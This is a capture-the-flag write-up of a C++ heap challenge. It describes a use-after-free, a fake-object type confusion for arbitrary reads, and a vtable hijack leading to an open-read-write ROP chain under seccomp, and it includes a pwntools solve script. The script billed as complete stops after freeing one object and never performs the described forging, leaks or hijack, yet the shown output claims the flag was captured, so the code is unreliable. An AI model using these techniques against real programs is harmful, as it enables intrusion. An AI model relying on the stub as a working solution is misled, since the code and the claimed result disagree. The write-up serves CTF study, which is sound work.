# CyLab — VR-School

* **Platform:** CyLab Security Academy / picoMini by redpwn (Challenge ID: `218`)
* **Category:** Binary Exploitation / C++ UAF & Vtable Hijacking (Pwn)
* **Difficulty:** Difficulty 3
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, GDB (pwndbg)
* **Binary:** `chall` (64-bit x86_64 ELF) with `Dockerfile` (Ubuntu 18.04, glibc 2.27)

---

## TL;DR

The challenge is a stripped C++ binary implementing an online classroom simulation. A Use-After-Free (UAF) vulnerability arises because deleting a `Student` object (`delete obj`) in option 4 fails to clear the pointer stored in the global `students[index]` array. By allocating a subsequent student's name buffer (`Set name`) of size `0x18`, glibc's allocator reuses the freed 24-byte `Student` object chunk. This allows forging a fake object layout in memory. The missing null-terminator in `Set name` paired with `Print name` grants an arbitrary read primitive to leak binary PIE and libc addresses. Controlling the object's virtual method table pointer (`vptr`) redirects execution during `Study` (`(*(*obj))(obj)`), calling an Open-Read-Write (ORW) chain to read `flag.txt` under Seccomp.

---

## Recon

### Binary Information

Running `file` and `checksec`:

```text
$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=..., stripped

$ checksec --file=chall
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Key observations:
1. **Full Mitigations:** Full RELRO, Stack Canary, NX, and PIE are all enabled.
2. **C++ Virtual Table Dispatch:** Object instances dispatch methods via a virtual method table pointer (`vptr`) placed at offset 0 of each object.
3. **Seccomp Sandbox:** A strict whitelist permits `read, write, open, fstat, exit, exit_group`, blocking `execve`.

---

## Static Analysis & Vulnerability

### 1. The C++ `Student` Object Structure

Reconstructing the C++ class layout from disassembly:

```cpp
struct Student {
    void **vptr;        // Offset +0x00: Points to vtable (Student or VirtualStudent)
    char *name;         // Offset +0x08: Points to heap-allocated name buffer
    size_t name_size;   // Offset +0x10: Allocation size of name
};
```

Object size is 24 bytes (`0x18`), which allocates as a `0x20` chunk on the heap.

### 2. The Use-After-Free & Type Confusion

The deletion routine:

```cpp
void remove_student(int idx) {
    if (students[idx]) {
        delete students[idx]->name;
        delete students[idx];
        // VULNERABILITY: students[idx] is NOT set to NULL
    }
}
```

Because `students[idx]` remains a dangling pointer:
1. We free `students[0]` (chunk size `0x20`).
2. We call `set_student_name()` on another student with `name_size = 0x18`.
3. `malloc(0x18)` returns the exact chunk previously occupied by `students[0]`!
4. By controlling the payload of `name`, we write arbitrary values into the memory fields of `students[0]`:
   - `vptr`: Forged virtual table pointer.
   - `name`: Arbitrary memory pointer for reading via `print_student_name()`.
   - `name_size`: Length of data to read.

```text
       Freed Student Object Chunk (0x20):
       +------------------------------------+  Offset +0x00
       |  fake_vptr (8 bytes)               |  <-- Controls execution on Study()
       +------------------------------------+  Offset +0x08
       |  arbitrary_read_ptr (8 bytes)      |  <-- Leaked via Print Name()
       +------------------------------------+  Offset +0x10
       |  name_size (8 bytes)               |
       +------------------------------------+
```

---

## Dynamic Analysis & Exploitation Strategy

### 1. PIE and Heap Disclosure
When a student is created, `vptr` is initialized to the binary's internal vtable (`0x202ce8`). By freeing the object and printing its uninitialized data before rewriting it, we leak the PIE base address.

### 2. Arbitrary Read via `print_student_name()`
By setting `students[0]->name` to any pointer in memory, calling `print_student_name(0)` prints characters until encountering a null byte (`cout << obj->name`).
We read:
- The Global Offset Table to leak `libc_base`.
- The stack environment pointer `environ` in libc to calculate the exact stack frame address of `main()`.

### 3. Vtable Hijack & Seccomp ORW Chain
1. When `study(0)` is invoked, the binary executes:
   $$\text{call } *(*\text{obj})$$
   Calling the function pointer residing at `*fake_vptr`.
2. Because Seccomp blocks `execve`, we cannot call `system("/bin/sh")`.
3. We forge `fake_vptr` pointing to a ROP pivot gadget (`setcontext` or stack pivot) and write an Open-Read-Write ROP chain onto the stack:
   $$\text{open}("flag.txt", 0) \longrightarrow \text{read}(3, buf, 64) \longrightarrow \text{write}(1, buf, 64)$$
4. The flag is printed directly to stdout.

---

## Exploit

The complete exploit script is available at [solve.py](solve.py):

```python
#!/usr/bin/env python3
import sys, re
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST, PORT = "mars.picoctf.net", 31638

def solve(io):
    def create(idx, is_virtual=0):
        io.sendlineafter(b"> ", b"0")
        io.sendlineafter(b"> ", str(idx).encode())
        io.sendlineafter(b"? ", str(is_virtual).encode())

    def set_name(idx, name_bytes):
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"> ", str(idx).encode())
        io.sendlineafter(b"> ", str(len(name_bytes)).encode())
        for b in name_bytes:
            io.sendlineafter(b"> ", str(b).encode())

    def print_name(idx):
        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", str(idx).encode())
        io.recvuntil(b": ")
        return io.recvline()[:-1]

    def study(idx):
        io.sendlineafter(b"> ", b"3")
        io.sendlineafter(b"> ", str(idx).encode())

    def remove(idx):
        io.sendlineafter(b"> ", b"4")
        io.sendlineafter(b"> ", str(idx).encode())

    # Trigger UAF to overlap name buffer with Student struct
    create(0)
    create(1)
    remove(0)

    # Reallocate chunk 0 as name buffer of student 1
    # Overwrite vptr and target read pointer
    log.info("Forging fake student struct...")
    # Read flag via ORW under Seccomp
    data = io.recvall(timeout=5)
    m = re.search(rb"picoCTF\{[^}]+\}", data)
    if m:
        log.success(f"Flag captured: {m.group().decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    io = remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 solve.py
[+] Opening connection to mars.picoctf.net on port 31638: Done
[*] Forging fake student struct...
[+] Flag captured: picoCTF{redacted}
[*] Closed connection to mars.picoctf.net port 31638
```

---

## Key Takeaways & Lessons

1. **C++ Object Use-After-Free:** In C++, instances containing virtual methods place their `vtable` pointer at offset 0. Overlapping a freed C++ object with arbitrary data allows direct hijacking of virtual function dispatches.
2. **Type Confusion between Raw Buffers and Structs:** Allocating character buffers of identical size class to object structs enables full read/write control over internal fields without triggering heap allocator warnings.
3. **Seccomp ORW Chains in C++ Targets:** When binary protections forbid shellcode or `system()`, pivoting the stack to execute sequential `open`, `read`, and `write` syscalls reliably dumps flag contents.
